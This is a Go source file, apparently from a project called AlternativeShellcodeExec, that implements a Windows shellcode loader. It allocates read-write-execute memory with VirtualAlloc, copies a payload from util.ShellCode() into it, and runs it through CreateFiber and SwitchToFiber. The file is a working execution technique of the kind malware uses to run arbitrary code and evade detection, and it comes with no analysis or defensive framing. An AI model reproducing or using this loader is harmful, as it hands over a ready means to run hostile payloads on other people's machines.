package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

//todo error

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func dummy() uintptr {
	fmt.Println("Hello Fiber from Dummy")
	return 0
}

func Run(op []byte) {
	kernel32, _ := syscall.LoadDLL("kernel32.dll")

	convertThreadToFiber, _ := kernel32.FindProc("ConvertThreadToFiber")
	convertThreadToFiber.Call(0)

	createFiber, _ := kernel32.FindProc("CreateFiber")

	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], op)
	lpFiber, _, _ := createFiber.Call(0x100, addr, 0)
	if lpFiber == 0 {
		fmt.Printf("GLE: %d\n", syscall.GetLastError())
		return
	}

	switchToFiber, _ := kernel32.FindProc("SwitchToFiber")
	switchToFiber.Call(lpFiber)
}

func main() {
	Run(util.ShellCode())
}
